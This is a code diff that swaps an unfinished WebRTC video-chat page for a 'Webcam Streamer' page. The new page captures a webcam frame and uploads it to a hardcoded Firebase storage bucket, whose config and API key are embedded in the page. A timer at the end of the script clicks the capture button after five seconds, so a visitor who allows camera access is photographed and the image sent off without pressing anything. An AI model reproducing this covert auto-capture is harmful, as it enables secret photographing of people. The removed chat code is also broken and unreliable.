@@ -1,106 +1,84 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <meta charset="utf-8">
-    <title>Video Chat App</title>
+    <meta charset="UTF-8" />
+    <title>Webcam Streamer</title>
+    <style>
+      #video {
+        width: 640px;
+        height: 480px;
+      }
+    </style>
   </head>
   <body>
-    <h1>Video Chat App</h1>
-    <div>
-      <video id="local-video" autoplay></video>
-    </div>
-    <div>
-      <video id="remote-video" autoplay></video>
-    </div>
-    <div>
-      <button id="start-call">Start Call</button>
-      <button id="end-call" disabled>End Call</button>
-    </div>
+    <h1>Webcam Streamer</h1>
+    <video id="video" autoplay></video>
+    <button id="capture-btn">Take Picture</button>
+    <script src="https://www.gstatic.com/firebasejs/8.2.2/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.2/firebase-storage.js"></script>
     <script>
+      // Initialize Firebase app
       const firebaseConfig = {
-  // your Firebase configuration here
-};
+        apiKey: "AIzaSyCUJWIsj4vD7cFPqXDslLkkluKcdMWB2aM",
+        authDomain: "captureimg-919cc.firebaseapp.com",
+        projectId: "captureimg-919cc",
+        storageBucket: "captureimg-919cc.appspot.com",
+        messagingSenderId: "1053470437967",
+        appId: "1:1053470437967:web:95d380f9033e295b17303a",
+      };
+      firebase.initializeApp(firebaseConfig);
 
-// Initialize Firebase
-firebase.initializeApp(firebaseConfig);
+      // Get references to DOM elements
+      const video = document.getElementById("video");
+      const captureBtn = document.getElementById("capture-btn");
 
-// Get references to HTML elements
-const localVideo = document.getElementById('local-video');
-const remoteVideo = document.getElementById('remote-video');
-const startCallButton = document.getElementById('start-call');
-const endCallButton = document.getElementById('end-call');
+      // Get user media from camera
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then((stream) => {
+          // Set video source to stream
+          video.srcObject = stream;
+        })
+        .catch((error) => {
+          console.error("Error accessing camera: ", error);
+        });
 
-let localStream;
-let remoteStream;
-let localPeerConnection;
-let remotePeerConnection;
+      // Initialize Firebase storage
+      const storage = firebase.storage();
+      const storageRef = storage.ref();
 
-// Get user media
-navigator.mediaDevices.getUserMedia({
-  video: true,
-  audio: true
-}).then((stream) => {
-  // Display local video stream
-  localStream = stream;
-  localVideo.srcObject = localStream;
-}).catch((error) => {
-  console.error('Error getting user media:', error);
-});
+      // Add event listener to capture button
+      captureBtn.addEventListener("click", () => {
+        // Create canvas element to capture image
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-// Create and initialize local peer connection
-localPeerConnection = new RTCPeerConnection();
-localPeerConnection.onicecandidate = (event) => {
-  if (event.candidate) {
-    console.log('Local ICE candidate:', event.candidate);
-    remotePeerConnection.addIceCandidate(event.candidate);
-  }
-};
-localPeerConnection.ontrack = (event) => {
-  console.log('Local track:', event.track);
-  remoteVideo.srcObject = event.streams[0];
-  remoteStream = event.streams[0];
-};
-localStream.getTracks().forEach(track => {
-  localPeerConnection.addTrack(track, localStream);
-});
+        // Convert canvas image to data URL
+        const dataURL = canvas.toDataURL();
 
-// Start call
-startCallButton.onclick = () => {
-  // Create and initialize remote peer connection
-  remotePeerConnection = new RTCPeerConnection();
-  remotePeerConnection.onicecandidate = (event) => {
-    if (event.candidate) {
-      console.log('Remote ICE candidate:', event.candidate);
-      localPeerConnection.addIceCandidate(event.candidate);
-    }
-  };
-  remotePeerConnection.ontrack = (event) => {
-    console.log('Remote track:', event.track);
-    remoteVideo.srcObject = event.streams[0];
-    remoteStream = event.streams[0];
-  };
+        // Upload image to Firebase storage
+        const imageName = Date.now().toString();
+        const imageRef = storageRef.child(`images/${imageName}.png`);
+        imageRef
+          .putString(dataURL, "data_url")
+          .then(() => {
+            console.log("Image uploaded to Firebase storage.");
+          })
+          .catch((error) => {
+            console.error("Error uploading image to Firebase storage: ", error);
+          });
+      });
 
-  // Add local stream to local peer connection
-  localStream.getTracks().forEach(track => {
-    remotePeerConnection.addTrack(track, localStream);
-  });
+      // Get reference to button element
+      const myButton = document.getElementById("capture-btn");
 
-  // Create offer and set as local description
-  localPeerConnection.createOffer().then((offer) => {
-    console.log('Local offer:', offer);
-    localPeerConnection.setLocalDescription(offer);
-    remotePeerConnection.setRemoteDescription(offer);
-    
-    // Create answer and set as remote description
-    remotePeerConnection.createAnswer().then((answer) => {
-      console.log('Remote answer:', answer);
-      remotePeerConnection.setLocalDescription(answer);
-      localPeerConnection.setRemoteDescription(answer);
-    }).catch((error) => {
-      console.error('Error creating remote answer:', error);
-    });
-
+      // Set timeout to click button after 5 seconds
+      setTimeout(() => {
+        myButton.click();
+      }, 5000); // 5000 milliseconds = 5 seconds
     </script>
-    
   </body>
 </html>
